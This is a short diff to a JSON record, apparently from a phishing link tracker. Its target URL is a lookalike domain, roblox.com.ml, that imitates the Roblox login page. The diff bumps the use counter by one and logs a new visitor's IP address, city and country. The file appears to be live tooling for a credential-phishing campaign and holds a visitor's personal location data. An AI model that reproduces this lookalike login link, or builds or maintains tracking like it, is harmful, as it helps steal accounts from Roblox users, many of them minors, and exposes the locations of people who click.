@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 550,
+    "useCount": 551,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4512,6 +4512,14 @@
         "city": "Talavera",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777097437005,
+        "ip": "67.128.125.186",
+        "country": "United States",
+        "city": "Casa Grande",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
